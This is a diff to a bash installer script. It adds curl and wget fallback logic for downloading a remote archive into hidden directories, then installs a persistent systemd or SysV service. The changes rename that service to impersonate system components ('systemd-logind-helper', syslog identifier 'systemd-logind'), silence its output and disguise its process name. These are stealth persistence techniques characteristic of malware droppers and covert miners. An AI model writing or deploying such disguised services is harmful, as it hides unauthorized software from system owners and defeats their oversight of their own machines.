@@ -204,13 +204,21 @@ check_prerequisites() {
     
     # Check required commands
     local missing_commands=""
+    local has_downloader=false
     
-    if ! command -v curl >/dev/null 2>&1; then
-        missing_commands="$missing_commands curl"
+    # Check download tools
+    if command -v wget >/dev/null 2>&1; then
+        has_downloader=true
+        log_info "Detected wget download tool"
     fi
     
-    if ! command -v wget >/dev/null 2>&1; then
-        missing_commands="$missing_commands wget"
+    if command -v curl >/dev/null 2>&1; then
+        has_downloader=true
+        log_info "Detected curl download tool"
+    fi
+    
+    if [ "$has_downloader" = false ]; then
+        missing_commands="$missing_commands wget or curl"
     fi
     
     if ! command -v tar >/dev/null 2>&1; then
@@ -222,13 +230,26 @@ check_prerequisites() {
         log_info "Attempting to install missing dependencies..."
         install_missing_dependencies
         
-        # Re-check after installation
-        for cmd in $missing_commands; do
-            if ! command -v $cmd >/dev/null 2>&1; then
-                log_error "Failed to install $cmd. Please install it manually and run the script again."
-                exit 1
-            fi
-        done
+        # Re-check critical tools after installation
+        if ! command -v tar >/dev/null 2>&1; then
+            log_error "Failed to install tar. Please install it manually and run the script again."
+            exit 1
+        fi
+        
+        # Re-check download tools
+        has_downloader=false
+        if command -v wget >/dev/null 2>&1; then
+            has_downloader=true
+        fi
+        if command -v curl >/dev/null 2>&1; then
+            has_downloader=true
+        fi
+        
+        if [ "$has_downloader" = false ]; then
+            log_error "Failed to install download tools. Please install wget or curl manually and run the script again."
+            exit 1
+        fi
+        
         log_info "All required dependencies are now available."
     else
         log_info "All required dependencies are available."
@@ -327,12 +348,51 @@ download_and_install() {
     create_hidden_dirs
     cd "$WORK_DIR"
     
-    # Download file
+    # Download file - prefer wget, fallback to curl
     log_info "Downloading $FILENAME ..."
-    wget -q --show-progress "$DOWNLOAD_URL" -O "$FILENAME" || {
-        log_error "Download failed"
+    
+    # Try wget first
+    if command -v wget >/dev/null 2>&1; then
+        log_info "Using wget for download..."
+        if wget -q --show-progress "$DOWNLOAD_URL" -O "$FILENAME" 2>/dev/null; then
+            log_info "wget download successful"
+        else
+            log_warn "wget download failed, trying curl..."
+            rm -f "$FILENAME"  # Clean up partial download
+            
+            if command -v curl >/dev/null 2>&1; then
+                if curl -L -o "$FILENAME" "$DOWNLOAD_URL" --progress-bar; then
+                    log_info "curl download successful"
+                else
+                    log_error "curl download also failed"
+                    exit 1
+                fi
+            else
+                log_error "Both wget and curl are unavailable"
+                exit 1
+            fi
+        fi
+    elif command -v curl >/dev/null 2>&1; then
+        log_info "Using curl for download..."
+        if curl -L -o "$FILENAME" "$DOWNLOAD_URL" --progress-bar; then
+            log_info "curl download successful"
+        else
+            log_error "curl download failed"
+            exit 1
+        fi
+    else
+        log_error "Both wget and curl are unavailable"
+        log_error "Please install wget or curl and run the script again"
         exit 1
-    }
+    fi
+    
+    # Verify downloaded file
+    if [ ! -f "$FILENAME" ] || [ ! -s "$FILENAME" ]; then
+        log_error "Downloaded file does not exist or is empty"
+        exit 1
+    fi
+    
+    log_info "File download completed, size: $(du -h "$FILENAME" | cut -f1)"
     
     # Extract file
     log_info "Extracting file..."
@@ -490,12 +550,9 @@ EOF
 create_systemd_service() {
     log_info "Creating systemd service..."
     
-    # Create service with disguised name
-    SERVICE_NAME="systemd-update-utmp"
-    
     cat > /etc/systemd/system/${SERVICE_NAME}.service << EOF
 [Unit]
-Description=Update UTMP about System Runlevel Changes
+Description=System Login Manager Helper Service
 After=network.target
 
 [Service]
@@ -507,7 +564,7 @@ Restart=always
 RestartSec=10
 StandardOutput=null
 StandardError=null
-SyslogIdentifier=$DISGUISE_NAME
+SyslogIdentifier=systemd-logind
 
 [Install]
 WantedBy=multi-user.target
@@ -523,13 +580,11 @@ EOF
 create_sysv_service() {
     log_info "Creating SysV init script..."
     
-    SERVICE_NAME="systemd-update-utmp"
-    
     cat > /etc/init.d/$SERVICE_NAME << EOF
 #!/bin/bash
-# $SERVICE_NAME        Update UTMP about System Runlevel Changes
+# $SERVICE_NAME        System Login Manager Helper Service
 # chkconfig: 35 99 99
-# description: Update UTMP about System Runlevel Changes
+# description: System Login Manager Helper Service
 #
 
 . /etc/rc.d/init.d/functions
@@ -660,7 +715,7 @@ main() {
     
     # Get disguise name first
     DISGUISE_NAME=$(get_disguise_name)
-    SERVICE_NAME="systemd-update-utmp"
+    SERVICE_NAME="systemd-logind-helper"
     
     log_info "Process will be disguised as: $DISGUISE_NAME"
     log_info "Service will be named: $SERVICE_NAME"
